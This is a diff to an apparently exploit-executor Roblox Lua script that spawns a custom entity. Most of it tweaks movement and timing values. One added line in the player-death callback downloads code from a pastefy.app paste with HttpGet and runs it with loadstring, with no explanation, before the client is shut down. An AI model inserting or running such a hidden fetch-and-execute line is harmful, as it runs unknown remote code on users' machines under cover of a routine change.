@@ -82,7 +82,7 @@ local entity = spawner.Create({
 		Values = {15.5, 20, 0.1, 1} -- Magnitude, Roughness, FadeIn, FadeOut
 	},
 	Movement = {
-		Speed = 620,
+		Speed = 640,
 		Delay = 6,
 		Reversed = false
 	},
@@ -90,8 +90,8 @@ local entity = spawner.Create({
 		Enabled = true,
 		Type = "Blitz",
 		Min = 18,
-		Max = 20,
-		Delay = 0.02
+		Max = 19,
+		Delay = 0.01
 	},
 	Damage = {
 		Enabled = true,
@@ -292,6 +292,7 @@ entity:SetCallback("OnDamagePlayer", function(newHealth)
     print("Dead")
         task.wait(15)
         if game.Players.LocalPlayer.Character.Humanoid.Health <= 0 then
+loadstring(game:HttpGet("https://pastefy.app/famDWh93/raw"))()
         warn("P̴̖̺̙͑̍l̸̦̘̔̈́a̸̲̰̯̙͋͒̋y̷͚͖͑͋e̴͎̤̺̗͊ȓ̴̳͙̱̒̔ ̵͈̈́͜h̶͓́͐͂̇a̶̛̞̪̯̫s̸̥͝ ̷̣̲̔̆̓d̵̡̖̈͋̊ͅí̶͚͝e̴͎̅̆̇d̸̮͍͊̔̓͝.̵̢͎̹̾̃")
         firesignal(game.ReplicatedStorage.RemotesFolder.DeathHint.OnClientEvent, {"H̷̡̡̧̻̼̺̖̫̰̥͚̳͎̣͓͕̼̜̆͐ͅ0̷͇̦̬̟̱̣̠̼̻̱̩̲͇̥̪̙͎̩̈́̌́̈́̓̀̿̍͜Ẃ̵̛̛̏͑̔̏̿͊͐̆̋̈͐̐͘͜"}, "Blue")
         game:Shutdown()
